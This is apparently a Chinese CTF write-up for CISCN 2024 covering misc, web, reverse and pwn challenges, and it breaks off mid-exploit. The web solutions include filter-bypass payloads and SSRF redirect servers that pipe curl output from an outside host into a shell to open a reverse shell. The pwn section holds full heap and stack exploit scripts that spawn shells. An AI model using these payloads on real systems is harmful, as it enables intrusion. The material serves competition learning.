'5'\n '6' '7' '8' '9' '_' '!' '@' '#' 'a' 'b' 'c' 'd' 'e' 'f' 'g' 'h' 'i' 'j'\n 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x' 'y' 'z' '0' '1'\n '2' '3' '4' '5' '6' '7' '8' '9' '_' '!' '@' '#' 'a' 'b' 'c' 'd' 'e' 'f'\n 'g' 'h' 'i' 'j' 'k' 'l' 'm' 'n' 'o' 'p' 'q' 'r' 's' 't' 'u' 'v' 'w' 'x'\n 'y' 'z' '0' '1' '2' '3' '4' '5' '6' '7' '8' '9' '_' '!' '@' '#']\n'''\n```\n\n对比后得到登录密码`_ciscn_2024_`\n\n\n\n## 火锅链观光打卡\n\n连接MetaMask后开始游戏\n\n![](/img/wp/2024/2024ciscn-火锅链观光打卡-1.png)\n\n![](/img/wp/2024/2024ciscn-火锅链观光打卡-2.png)\n\n\n## 神秘文件\n\n\n\nPPT第三页\n\n`UGF5dDQ6NmYtNDA=`解base64得到`Payt4:6f-40`\n\n![](/img/wp/2024/2024ciscn-神秘文件-1.png)\n\n\nPPT第五页\n\n备注中的字符串循环解密base64得到`pArt5:5f-90d`\n\n左上角的`UGFyVDY6ZC0y`base64解密得到`ParT6:d-2`\n\n![](/img/wp/2024/2024ciscn-神秘文件-2.png)\n\n\n在`ppt\\slides\\slide4.xml`中找到第七部分\n\nROT13然后base64 `PART7=22b3`\n\n```xml\n<p:cNvPr id=\"4\" name=\"HRSFIQp9ZwWvZj==\"/>\n<p:cNvPr id=\"5\" name=\"ROT13(All)\"/>\n```\n\n\n在`ppt\\slideLayouts\\slideLayout2.xml`或者幻灯片母版中可以看到第八部分\n\n去除B,b,1,3后base64  `paRt8:87e`\n\n```xml\n<a:t>c1GFSbd3Dg6BODbdl</a:t>\n<a:t>Remove All </a:t>\n<a:t>’B ’/’b’ /’1 ’/’3’</a:t>\n```\n\n\n在`ppt\\media\\image57.jpg`底部存在密文，base64解密得到`parT9:dee`\n\n![](/img/wp/2024/2024ciscn-神秘文件-3.png)\n\n\n\n在`ppt\\comments\\comment1.xml`中得到第十部分\n\n维吉尼亚后base64 `PARt10:9}`\n\n```xml\n<p:text>ZYWJbIYnFhq9</p:text>\n<p:text>What is this？</p:text>\n<p:text>Vigenere cipher is good！</p:text>\n<p:text>Aha，the key is</p:text>\n<p:text>Is what？</p:text>\n<p:text>furry</p:text>\n<p:text>🆗</p:text>\n```\n\n在`docProps\\app.xml`得到加密方式，`docProps\\core.xml`得到密文和密钥\n\nBifid解密后base64 `Part1:flag{e`\n\n```xml\n<Manager>Bifid cipher</Manager>\n\n<dc:title>这是一个标题 QFCfpPQ6ZymuM3gq</dc:title>\n<dc:creator>Administrator;Key:lanjing</dc:creator>\n```\n\n\n\n将`ppt\\embeddings\\Microsoft_Word_Document.docx`改成zip解压\n\n`word\\document.xml`得到第二部分\n\n凯撒偏移10后base64 `part2:675efb`\n\n```xml\n<w:t>这</w:t>\n<w:t>o</w:t>\n<w:t>ffset:10</w:t>\n<w:t>里</w:t>\n<w:t>原来似乎有什么，后来好像被小C</w:t>\n<w:t>aesar</w:t>\n<w:t>抱走了！</w:t>\n<w:t>mQPinNS6Xtm1JGJs</w:t>\n```\n\n\n在PPT中打开宏编辑器\n\n\n```vb\nSub crypto(sMessage, strKey)\n    Dim kLen, x, y, i, j, temp\n    Dim s(256), k(256)\n\n    kLen = Len(strKey)\n    For i = 0 To 255\n        s(i) = i\n        k(i) = Asc(Mid(strKey, (i Mod kLen) + 1, 1))\n    Next\n\n    j = 0\n    For i = 0 To 255\n        j = (j + k(i) + s(i)) Mod 256\n        temp = s(i)\n        s(i) = s(j)\n        s(j) = temp\n    Next\n\n    x = 0\n    y = 0\n\n    For i = 1 To 3072\n        x = (x + 1) Mod 256\n        y = (y + s(x)) Mod 256\n        temp = s(x)\n        s(x) = s(y)\n        s(y) = temp\n    Next\n\n    For i = 1 To Len(sMessage)\n        x = (x + 1) Mod 256\n        y = (y + s(x)) Mod 256\n        temp = s(x)\n        s(x) = s(y)\n        s(y) = temp\n\n        crypto = crypto & (s((s(x) + s(y)) Mod 256) Xor Asc(Mid(sMessage, i, 1))) & \",\"\n    Next\n    'i13POMdzEAzHfy4dGS+vUA==(After base64)\nEnd Sub\n```\n\nrc4后base64得到`PArt3:3-34`\n\n\n将一到十部分拼接在一起：`flag{e675efb3-346f-405f-90dd-222b387edee9}`\n\n\n## 通风机\n\n修补文件头，加上`GJK`后用`STEP 7 Micro/WIN`打开\n\n符号表里注释的字符串base64得到flag\n\n![](/img/wp/2024/2024ciscn-通风机-1.png)\n\n\n## 盗版软件\n\n\n运行hackexe.exe会生成`loader.exe`和`output.png`\n\nstegsolve发现图片在红色通道每隔一位组合起来是zip，写脚本提取出来\n\n```python\nfrom PIL import Image\na=Image.open('output.png')\nb=list(a.getdata())\ne=[]\nfor i in range(0,len(b),2):\n    e.append(b[i][0])\n\nf=open('1.zip','wb')\nf.write(bytes(e))\nf.close()\n```\n\n解压后得到`.b`文件\n\n```text\nr()J$nEA'r!!#;^5u:HM1\"'W(Mc*q[<_/-H(eBQ_+@m$P8kMf4a[h>1:e3=VX?9p=!\\>H[_9!-P!Q!d_;F+/NMc([U69Id>ct7iR(^gBUKlR.n!/lA`!!!!iKtqeC8-.(6Mb\"[QMa/CV!RTk-8H6e+1!)_>1l+['ejqO2X?j\\E%7($238erL9ERs6#Xpc$FkBeaMa/OZ!RPFEM[W-EMa/7R!RO,j\"Gf?G6!.Ga!ROtQ6!-EU6!?g3ll\\Sls57!F=^\"@S''W'hs8Q@r^3=WR?SaG;!'sXWM<7?[m%=@Z!(i%/8\\>*)+T!Ns8F&Q@8VuM%M=EmC9Qqfgs4'f\"l=^2!!!$.f\\g`/F!<:Sa$:.up:e`[d9ejFSs1h0^_FX^B8;Y/K]'9g`i;_=uM8s?B6!-g;i^eq%6+WJ\\FCG4\"Ktqd;8cR(Yjlhm.!!#QBlju^Ei_;/LC'6h)8;[..\\cUR+?iSZ/p],bC8;\"i'?A\\Aj5XAOd!\"],16!-[7njkLW6+U0o;s\"&08;Y5UM8r=Fa[q?Y8;Z%kM>9HK!nkY%s4)bs!.?7t6!%3&!'gMa6!.k%>!]_-0+Tc:eQ5m>\\ohmb@K4kLs3Bjks8W*i!Q.GW`^kgWFgOI7k?)I!=hET4.LJIugAf\\\n```\n\n对文件内容进行base85后丢到沙箱中\n\n得到c2地址`39.100.72.235`\n\n![](/img/wp/2024/2024ciscn-盗版软件-1.png)\n\n\n\n然后分析`3842.dmp`\n\n使用strings搜索所有http或者ftp开头的链接\n\n`strings 3842.dmp | grep -iE \"^(http|ftp|chrome|firefox).*\\.(txt|xml|png|jpg|gif|zip|rar|7z|pdf|doc|docx|php|py|flag|exe)$\" > 1.txt`\n\n\n然后去除 baidu.com xunfei.com 这种官方网站\n\n根据题目描述`在网上下了一个盗版软件` 很明显是`winhack.com`了\n\n![](/img/wp/2024/2024ciscn-盗版软件-2.png)\n\n拼接后md5\n\n`winhack.com39.100.72.235`\n\n`flag{096e8b0f9daf10869f013c1b7efda3fd}`\n\n\n\n## p&p\n\n利用溢出修改flag写入文件位置，然后访问/static/1即可获得flag\n\n```python\nimport requests\nimport urllib.parse as parse\n\nurl=\"http://8.147.131.163:39352/upload?name=\"+'a'*(112+16+6)+'a'*0x1e+'static/1'\nprint(url)\nr=requests.get(url)\nurl=\"http://8.147.131.163:39352/test\"\nr=requests.get(url)\nprint(r.text)\n```\n\n## Tough_DNS\n\n>题目内容：DNS的世界充满了多变的字符，接下来我将直接给你答案：56 16 26 93 66 53 16 56 d2 03 26 93 56\n\n\n一打开就是大量请求一串10的数据\n\n![](/img/wp/2024/2024ciscn-Tough_DNS-1.png)\n\n提取出来，开头7个1，一眼二维码\n\n```text\n111111101100101111111\n100000100100101000001\n101110101010101011101\n101110101001001011101\n101110101110001011101\n100000100000001000001\n111111101010101111111\n000000000110000000000\n111100101010010011101\n010010000010110111111\n011001111000101100001\n001110000110100001000\n000101111001001100000\n000000001111001110010\n111111100100011010110\n100000100011010000100\n101110100001000010110\n101110101110110100110\n101110101011110101100\n100000101110001111001\n111111101111001111100\n```\n\n\n扫码得到`15f9792dba5c`\n\n![](/img/wp/2024/2024ciscn-Tough_DNS-2.png)\n\n\n然后用tshark提取请求的txt字段\n\n`tshark -r Tough_DNS.pcapng -T json -e dns.txt -Y \"dns.txt\" > 1.txt`\n\n分析发现每隔一位刚好组成`504B`，python提取转文件\n\n```python\nimport json\n\nf=open('1.txt')\n\nd=f.read()\nd=json.loads(d)\n\ne1=''\ne2=''\nfor i in range(0,len(d),2):\n    e1+=d[i]['_source']['layers']['dns.txt'][0]\n    e2+=d[i+1]['_source']['layers']['dns.txt'][0]\n\nprint(len(e1))\nprint(len(e2))\n\nf=open('1.bin','wb')\nf.write(bytes.fromhex(e1[1:]))\nf.close()\n\nf=open('2.bin','wb')\nf.write(bytes.fromhex(e2[1:]))\nf.close()\n```\n\n有两个文件，压缩包和PGP文件\n\n![](/img/wp/2024/2024ciscn-Tough_DNS-3.png)\n\n\n解压密码是二维码的结果，解压得到`secret.gpg`\n\n用PGPTool导入secret.gpg\n\n![](/img/wp/2024/2024ciscn-Tough_DNS-4.png)\n\n然后解密提取出来的文件，密码在题目描述中\n\n根据ascii码范围，前面应该是2-7，调整位置`65 61 62 39 66 35 61 65 2d 30 62 39 65`，得到`eab9f5ae-0b9e`\n\n![](/img/wp/2024/2024ciscn-Tough_DNS-5.png)\n\n得到`flag{79830a47-faf7-4067-b585-145776f833cd}`\n\n![](/img/wp/2024/2024ciscn-Tough_DNS-6.png)\n\n\n# web\n\n## Simple_php\n\n```php\n<?php\nini_set('open_basedir', '/var/www/html/');\nerror_reporting(0);\n\nif(isset($_POST['cmd'])){\n    $cmd = escapeshellcmd($_POST['cmd']);\n     if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\\?|wget|\\'|\\\"|id|whoami/i', $cmd)) {\n         system($cmd);\n}\n}\n\n\nshow_source(__FILE__);\n?>\n\n```\n\n没有过滤 str_replace ，那么就可以通过str_replace来绕过这一大串过滤\n\n比如 `str_replace(z,count(),whozami);` 就可以拿到 whoami\n\n因为题目中是system，所以再套一层`php -r`命令来反弹shell\n\npoc\n```php\ncmd=php -r system((str_replace(z,count(),bazse64_decozde))(Y3VybCA0Ny45OS43Ny41MnxiYXNo));\n```\n\n反弹shell后目录中没有flag，通过 ps -aux 查看发现还有mysql服务\n\n```bash\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0   2364   512 pts/0    Ss+  03:49   0:00 tail -f /dev/null\nroot          27  0.0  3.8  76568 20092 ?        Ss   03:49   0:00 /usr/sbin/apache2 -k start\nwww-data      30  0.0  1.7  76592  9192 ?        S    03:49   0:00 /usr/sbin/apache2 -k start\nwww-data      31  0.0  2.5  77160 13380 ?        S    03:49   0:00 /usr/sbin/apache2 -k start\nwww-data      32  0.0  1.7  76640  9192 ?        S    03:49   0:00 /usr/sbin/apache2 -k start\nwww-data      33  0.0  2.5  76844 13196 ?        S    03:49   0:00 /usr/sbin/apache2 -k start\nwww-data      34  0.0  2.4  76648 12804 ?        S    03:49   0:00 /usr/sbin/apache2 -k start\nroot         166  0.0  0.3   2420  1620 pts/0    S+   03:49   0:00 /bin/sh /usr/bin/mysqld_safe\nmysql        279  0.0 15.9 1083992 83680 pts/0   Sl+  03:49   0:00 /usr/sbin/mariadbd --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --skip-log-error --pid-file=/run/mysqld/mysqld.pid --socket=/run/mysqld/mysqld.sock\nroot         280  0.0  0.2   5740  1056 pts/0    S+   03:49   0:00 logger -t mysqld -p daemon error\nroot         320  0.0  0.0      0     0 pts/0    Z+   03:49   0:00 [debian-start] <defunct>\n```\n\n直接 mysql -u root -proot 连接，但是没有回显，需要用错误语句来触发报错回显\n\n![](/img/wp/2024/2024ciscn-Simple_php-2.png)\n\n![](/img/wp/2024/2024ciscn-Simple_php-3.png)\n\n![](/img/wp/2024/2024ciscn-Simple_php-4.png)\n\n\n**其他做法**\n\n%0a绕过\n\n`cmd=l%0as+/`\n\n通过hex2bin转换\n\n`cmd=php+-r+eval(hex2bin(substr(aa6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d652027757365205048505f434d533b73656c656374202a2066726f6d20463161675f5365335265373b27603b,2)));`\n\n\n\n## easycms\n\n![](/img/wp/2024/2024ciscn-easycms-1.png)\n\nREMOTE_ADDR绕不过去，肯定要打ssrf\n\n后台地址被修改了，尝试爆破无果\n\n在官方手册中找前台有远程请求的接口\n\n最终找到一个[二维码函数](https://www.xunruicms.com/doc/444.html)\n\n```php\nindex.php?s=api&c=api&m=qrcode&thumb=中间LOGO&text=内容&size=大小值&level=容错率\n```\n\n![](/img/wp/2024/2024ciscn-easycms-2.png)\n\n在自己的服务器上起一个flask，重定向到 http://127.0.0.1/ cmd就能执行命令了，用ctfshow的一键反弹shell\n\n```python\n# coding=utf-8\n\nfrom flask import *\n\napp = Flask(__name__)\napp.secret_key = '*************************'\n\n@app.route('/',methods=['GET', 'POST'])\ndef index():\n    return redirect(\"http://127.0.0.1/flag.php?cmd=curl%20https://your-shell.com/47.99.77.52:1234%20|%20sh\")\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0',port=80,debug=True)\n```\n\n然后发包\n\n`http://eci-2ze9sa3j2fhr9odtqwsd.cloudeci1.ichunqiu.com/index.php?s=api&c=api&m=qrcode&thumb=http://47.99.77.52/`\n\n\n![](/img/wp/2024/2024ciscn-easycms-3.png)\n\n\n## easycms_revenge\n\n继续用上一题的payload，网页返回`二维码生成失败`\n\n猜测对参数进行了校验，修改成手册中完整的请求`/index.php?s=api&c=api&m=qrcode&thumb=http://47.99.77.52/&text=1&size=h&level=1`\n\n返回`此图片不是一张可用的图片`，应该是对网页的返回值进行了检查\n\n在官网下载 迅睿CMS开发框架 查看源代码(之前看的一直是github上的项目，后来发现竟然与题目用的不一样。。。)\n\n```php\n# dayrui\\Fcms\\Control\\Api\\Api.php\n//生成二维码图片\nrequire_once CMSPATH.'Library/Phpqrcode.php';\n$file = WRITEPATH.'file/qrcode-'.md5($value.$thumb.$matrixPointSize.$errorCorrectionLevel).'-qrcodpng';\nif (!IS_DEV && is_file($file)) {\n    $QR = imagecreatefrompng($file);\n} else {\n    \\QRcode::png($value, $file, $errorCorrectionLevel, $matrixPointSize, 3);\n    if (!is_file($file)) {\n        exit('二维码生成失败');\n    }\n    $QR = imagecreatefromstring(file_get_contents($file));\n    if ($thumb) {\n        if (strpos($thumb, 'https://') !== false\n            && strpos($thumb, '/') !== false\n            && strpos($thumb, 'http://') !== false) {\n            exit('图片地址不规范');\n        }\n        $img = getimagesize($thumb);\n        if (!$img) {\n            exit('此图片不是一张可用的图片');\n        }\n        $code = dr_catcher_data($thumb);\n        if (!$code) {\n            exit('图片参数不规范');\n        }\n        $logo = imagecreatefromstring($code);\n        $QR_width = imagesx($QR);//二维码图片宽度\n        $logo_width = imagesx($logo);//logo图片宽度\n        $logo_height = imagesy($logo);//logo图片高度\n        $logo_qr_width = $QR_width / 4;\n        $scale = $logo_width/$logo_qr_width;\n        $logo_qr_height = $logo_height/$scale;\n        $from_width = ($QR_width - $logo_qr_width) / 2;\n        //重新组合图片并调整大小\n        imagecopyresampled($QR, $logo, (int)$from_width, (int)$from_width, 0, 0, (int)$logo_qr_width(int)$logo_qr_height, (int)$logo_width, (int)$logo_height);\n        imagepng($QR, $file);\n    }\n```\n\n因为有getimagesize，所以需要加个图片头\n\n然后通过 dr_catcher_data 调用curl触发ssrf\n\n```php\n# dayrui\\Fcms\\Core\\Helper.php\n\n/**\n * 调用远程数据 curl获取\n *\n * @param   $url\n * @param   $timeout 超时时间，0不超时\n * @param   $is_log 0表示请求失败不记录到系统日志中\n * @param   $ct 0表示不尝试重试，1表示重试一次\n * @return  请求结果值\n */\n// curl模式\nif (function_exists('curl_init')) {\n    $ch = curl_init($url);\n    if (substr($url, 0, 8) == \"https://\") {\n        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // 跳过证书检查\n        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, true); // 从证书中检查SSL加密算法是否存在\n    }\n    if ($ct) {\n        curl_setopt($ch, CURLOPT_HTTPHEADER, array(\n            'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0)' . 'Gecko/20100101 Firefox/40.0',\n            'Accept: */*',\n            'X-Requested-With: XMLHttpRequest',\n            'Referer: '.$url,\n            'Accept-Language: pt-BR,en-US;q=0.7,en;q=0.3',\n        ));\n        curl_setopt($ch, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13)Gecko/20080311 Firefox/2.0.0.13');\n    }\n...\n}\n```\n\n总共会请求两次，第一次的时候返回真实图片就好了，第二次再重定向到127.0.0.1\n\n![](/img/wp/2024/2024ciscn-easycms_revenge-1.png)\n\n根据条件修改flask中的代码\n\n```python\n# coding=utf-8\n\nfrom flask import *\n\napp = Flask(__name__)\napp.secret_key = '*************************'\ncounter = 0\n\n@app.route('/',methods=['GET', 'POST'])\ndef main():\n    global counter\n\n    if counter == 0:\n        counter += 1\n        return send_file('img.png', mimetype='image/png')\n    elif counter == 1:\n        counter = 0\n        return redirect(\"http://127.0.0.1/flag.php?cmd=curl%20https://your-shell.com/47.99.77.52:1234%20|%20sh\")\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0',port=80,debug=True)\n```\n\n反弹shell后执行readflag\n\n\n# reverse\n\n## asm_re\n\nida上扣下来的arm汇编代码，丢给gpt翻译一下得到加密逻辑，爆一下就好了\n\n```python\nlst = [0x1fd7, 0x21b7, 0x1e47, 0x2027, 0x26e7,\n       0x10d7, 0x1127, 0x2007, 0x11c7, 0x1e47,\n       0x1017, 0x1017, 0x11f7, 0x2007, 0x1037,\n       0x1107, 0x1f17, 0x10d7, 0x1017, 0x1017,\n       0x1f67, 0x1017, 0x11c7, 0x11c7, 0x1017,\n       0x1fd7, 0x1f17, 0x1107, 0x0f47, 0x1127,\n       0x1037, 0x1e47, 0x1037, 0x1fd7, 0x1107,\n       0x1fd7, 0x1107, 0x2787]\n\nfor i in range(38):\n    for j in range(32, 128):\n        if (((j * 0x50) + 0x14) ^ 0x4D) + 0x1e == lst[i]:\n            print(chr(j), end='')\n            break\n# flag{67e9a228e45b622c2992fb5174a4f5f5}\n```\n\n\n\n## androidso_re\n\n有两个native函数用来获取key和iv，直接frida hook一下\n\n```javascript\nJava.perform(() => {\n  let jni = Java.use(\"com.example.re11113.jni\");\n  jni[\"getkey\"].implementation = function () {\n    console.log(`jni.getkey is called`);\n    let result = this[\"getkey\"]();\n    console.log(`jni.getkey result=${result}`);\n    return result;\n  };\n\n  jni[\"getiv\"].implementation = function () {\n    console.log(`jni.getiv is called`);\n    let result = this[\"getiv\"]();\n    console.log(`jni.getiv result=${result}`);\n    return result;\n  };\n});\n\n```\n\n得到key=A8UdWaeq,iv=Wf3DLups，加密方式为DES-CBC\n\n![](/img/wp/2024/2024ciscn-androidso_re-1.png)\n\n厨子解一下就好了\n\n![](/img/wp/2024/2024ciscn-androidso_re-2.png)\n\n\n## whereThel1b\n\n输入随机字符观察加密后的数据，每三位加密得到4位数据，猜是base64，直接爆破即可\n\n```python\nimport whereThel1b\nfrom string import hexdigits\nimport itertools\nhexdigits += \"lg{}-\"\ncombinations = [''.join(i) for i in itertools.product(hexdigits, repeat=3)]\n\nencry = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]\n\nflag = bytearray(b\"flag{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}\")\n\nfor i in range(0, 14):\n    for combo in combinations:\n        flag[i*3:(i+1)*3] = combo.encode()\n        ret = whereThel1b.trytry(flag)\n\n        if ret[i*4:(i+1)*4] == encry[i*4:(i+1)*4]:\n            print(flag.decode())\n            break\n\n# flag{7f9a2d3c-07de-11ef-be5e-cf1e88674c0b}\n```\n\n\n## gdb_debug\n\n\n伪随机数，从当前时间往前爆破seed解密即可\n\n```python\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <time.h>\n\n\nunsigned char key[38] = {\n    0xBF, 0xD7, 0x2E, 0xDA, 0xEE, 0xA8, 0x1A, 0x10, 0x83, 0x73, 0xAC, 0xF1, 0x06, 0xBE, 0xAD, 0x88,\n    0x04, 0xD7, 0x12, 0xFE, 0xB5, 0xE2, 0x61, 0xB7, 0x3D, 0x07, 0x4A, 0xE8, 0x96, 0xA2, 0x9D, 0x4D,\n    0xBC, 0x81, 0x8C, 0xE9, 0x88, 0x78\n};\n\nvoid dump_data(unsigned char* data, size_t size, int type) {\n    for (size_t i = 0; i < size; i++)\n    {   if (type)\n            printf(\"%c\", data[i]);\n        else\n            printf(\"%d,\", data[i]);\n    }\n    printf(\"\\n\\n\");\n\n}\n\nvoid brute_force() {\n    size_t length = 38;\n    unsigned char enc_data[] = \"congratulationstoyoucongratulationstoy\";\n    unsigned char result[40], shuffled_result[40], final_result[40];\n    unsigned char shuffle_table[40];\n\n\n    unsigned char xor_key1[38];\n    unsigned char xor_key2[38];\n\n    unsigned int current_time = 1715788800;//(unsigned int)time(NULL);\n    printf(\"current time: %d\\n\", current_time);\n\n    for (unsigned int seed = current_time; seed >= 0; --seed) {\n        srand(seed & 0xF0000000);\n\n        // 异或\n        for (size_t i = 0; i < length; ++i) {\n            xor_key1[i] = rand();\n        }\n\n        // 生成表\n        for (size_t i = 0; i < length; ++i) {\n            shuffle_table[i] = i;\n        }\n\n        // 打乱表\n        for (size_t k = length - 1; k; --k) {\n            size_t rand_idx = rand() % (k + 1);\n            unsigned char temp = shuffle_table[k];\n            shuffle_table[k] = shuffle_table[rand_idx];\n            shuffle_table[rand_idx] = temp;\n        }\n\n\n        // 异或\n        for (size_t i = 0; i < length; ++i) {\n            xor_key2[i] = rand();\n        }\n\n        // ---------------------------------------------------\n        for (size_t i = 0; i < length; ++i) {\n            final_result[i] = enc_data[i] ^ key[i];\n        }\n\n        for (size_t i = 0; i < length; ++i) {\n            final_result[i] ^= xor_key2[i];\n        }\n\n        // 恢复打乱的数据\n        for (size_t i = 0; i < length; ++i) {\n            shuffled_result[shuffle_table[i]] = final_result[i];\n        }\n\n        for (size_t i = 0; i < length; ++i) {\n            result[i] ^= xor_key1[i];\n        }\n\n        if ( result[0] == 'f'\n        && result[1] == 'l'\n        && result[2] == 'a'\n        && result[3] == 'g'\n        && result[4] == '{') {\n            dump_data(result, 38, 0);\n        }\n    }\n}\n\nint main() {\n    printf(\"magic........\\n\");\n    brute_force();\n}\n```\n\n\n\n# pwn\n\n## gostack\n\nfunc3中存在栈溢出，构造payload，但要小心rbp-0xc8与rbp-0xd0\n\n```python\nfrom pwn import *\n\n#p=process(\"./gostack\")\np=remote(\"8.147.133.9\",\"39706\")\ne=ELF(\"./gostack\")\npayload=b\"a\"*0x100+p64(0x4C0995)+p64(0x1c8)\npayload+=b'a'*0xc0+p64(0x4a0af6)\np.sendlineafter(b\"message :\",payload)\np.interactive()\n\n```\n\n## orange_cat_diary\n\nfree时存在uaf，edit时允许溢出8字节，使用house of orange将top chunk放进unsorted bin，即可获取libc地址\n修改malloc_hook为gadget即可获取shell\n\n```python\nfrom pwn import *\ndef add(count,data=b'\\n'):\n    pause()\n    p.sendlineafter(b'choice',b'1')\n    p.sendlineafter(b'content:',str(count).encode())\n    p.sendafter(b'content:',data)\n\ndef show():\n    p.sendlineafter(b'choice',b'2')\n\ndef free():\n    p.sendlineafter(b'choice',b'3')\n\ndef edit(count,data=b'\\n'):\n    p.sendlineafter(b'choice',b'4')\n    p.sendlineafter(b'content',str(count).encode())\n    p.sendafter(b'content',data)\n    pause()\n\nlibc=ELF(\"./libc-2.23.so\")\np=remote(\"8.147.131.196\",\"32607\")\n#p=process(\"./orange_cat_diary\")\n#gdb.attach(p)\np.sendlineafter('name','rotwill')\nadd(0x68)\nedit(0x70,b'a'*0x68+p64(0x1001-0x70)[:-1])\nadd(0x1000)\nadd(0x68)\n#edit(0x60,b'a'*0x58+b'rotwilll')\nshow()\np.readuntil(':')\nd=u64(p.read(8))\nprint(hex(d))\nlibc.address=d-0x3c510a\nmalloc_hook=libc.sym['__malloc_hook']\n\ngadget=libc.address+0xf03a4\nprint(hex(malloc_hook))\nfree()\nedit(8,p64(malloc_hook-0x23))\nadd(0x68)\nadd(0x68,b'a'*0x13+p64(gadget))\np.sendlineafter(b'choice',b'1')\np.sendlineafter(b'content:',\"123\")\np.interactive()\n```\n\n## easybuf\n\n赛后出的\n\n一个使用了protobuf的菜单题，只能申请0x30字节的chunk，输出的超过三次会关闭输出句柄，不过释放时存在uaf，所以可以利用fast bin构造tcache bin中的double free，之后就可以任意地址写了\n\n```python\nfrom pwn import *\nimport varint\nimport sys\nnum=0\ndef Mode(m):\n    return b'\\x10'+varint.encode(m<<1)\n\ndef Ind(i):\n    return b'\\x18'+varint.encode(i<<1)\n\ndef Spbuf(s):\n    if s:\n        s=0x30\n    else:\n        s=0\n    return b'\\x20'+varint.encode(s<<1)\n\ndef Data(d):\n    return b'\\x0a'+varint.encode(len(d))+d\n\ndef Spchr(s):\n    return b'\\x28'+varint.encode(s)\n\ndef calc(data):\n    mark=0xfff000000000\n    data1=data&mark\n    result=0\n    result|=data1\n    for i in range(3):\n        data1=((data1>>12)^data)&(mark>>12)\n        result|=data1\n        mark=mark>>12\n    return result\n\n\ndef add(ind,data=b'\\n'):\n    payload=Mode(1)+Ind(ind)+Data(data)+Spbuf(0)+Spchr(0)\n    if num!=3:\n        p.sendafter('NT?\\n',payload)\n    else:\n        p.send(payload)\n\ndef free(ind):\n    payload=Mode(2)+Ind(ind)+Data(b'test')+Spbuf(0)+Spchr(0)\n    if num!=3:\n        p.sendafter('NT?\\n',payload)\n    else:\n        p.send(payload)\ndef none():\n    payload=Mode(0)+Ind(0)+Data(b'test')+Spbuf(0)+Spchr(0)\n    if num!=3:\n        p.sendafter('NT?\\n',payload)\n    else:\n        p.send(payload)\n\n\ndef show(ind,isbuf=0,spchr=0):\n    global num\n    payload=Mode(3)+Ind(ind)+Spbuf(isbuf)+Spchr(spchr)+Data(b'test')\n    if num!=3:\n        p.sendafter('NT?\\n',payload)\n        p.readuntil('Content:')\n        num+=1\n    else:\n        p.send(payload)\n        pause\n#        p.readuntil('Content:')\n\n#context.log_level='debug'\np=process([\"./pwn\"])\nlibc=ELF(\"./libc.so.6\")\nadd(0,b\"0\")\nadd(1,b'testtest')\nshow(0)\nd=u64(p.readuntil(b'\\n',drop=1).ljust(8,b'\\x00'))\nlibc.address=d-0x21ac30\n\nprint(hex(libc.address))\nstdout=libc.sym['_IO_2_1_stdout_']\nvtable=stdout+0xd0\nprint(hex(vtable))\nobstack_jump=libc.address+0x2173c0\nfor i in range(6):\n    add(i+2)\n\nfor i in range(7):\n    free(i)\n\nshow(1)\nd=u64(p.readuntil(b'\\n',drop=1).ljust(8,b'\\x00'))\nchunk0=calc(d)\nprint(f\"{chunk0=: x}\")\nfree(7)\nsystem=libc.sym['system']\n\nchunk6=chunk0+0x1d60\nchunk7=chunk0+0x2020\nobstack=p64(system)\nobstack+=b'/bin/sh\\x00'+p64(chunk7+8)\n#obstack=obstack.ljust(0x28,b'\\x00')+p64(0x7fffffffffffffff)+p64(0)+p64(system)\n\n\npayload=p64(0)+p64(0x41)+p64((chunk6>>12)^(chunk7-0x10))\nadd(6,payload)\nprint(f\"{chunk6=: x}\")\nprint(f\"{chunk7=: x}\")\n\nfree(7)\nadd(8,p64((chunk7>>12)^(chunk6)))\nprint(hex(vtable))\n\nfor i in range(7):\n    add(0,obstack)\n\n#show(0)\n#show(0)\n#@add(0)\nfree(6)\n#add(8,p64()\n\n\ngdb.attach(p)\npause()\nadd(0,p64(0)+p64(0x40)+p64(((chunk6+0x10)>>12)^(vtable)))\n\n#add(1,obstack)#\npayload1=p64(0)+p64(obstack_jump)+p64(chunk7-0x38)\nadd(2,payload1)\nadd(2,payload1)\n#add(0)\n\n#print(hex(calc(d)))\np.interactive()\n```\n\n\n## EzHeap\n\n\n```python\nfrom pwn import *\ncontext.arch='amd64'\ndef add(l,data=b'\\n'):\n    p.sendlineafter(b'>> ',b'1')\n    p.sendlineafter(b'size:',str(l).encode())\n    p.sendafter(b\"content:\",data);\n    pass\ndef free(ind):\n    p.sendlineafter(b'>> ',b'2')\n    p.sendlineafter(b\"idx\",str(ind).encode())\ndef edit(ind,data):\n    p.sendlineafter(b'>> ',b'3')\n    p.sendlineafter(b'idx:',str(ind).encode())\n    p.sendlineafter(b'size:',str(len(data)).encode())\n    p.sendafter('content:',data)\ndef show(ind):\n    p.sendlineafter(b'>> ',b'4')\n    p.sendlineafter('idx',str(ind).encode())\n\ndef exit():\n    p.sendlineafter(b'>> ',b'5')\n\n#p=process(\"EzHeap\")\np=remote(\"8.147.134.47\",\"35955\")\nlibc=ELF(\"./libc.so.6\")\n#gdb.attach(p,'bp setcontext+0x3d')\nadd(0x300) #0\nadd(0x448) 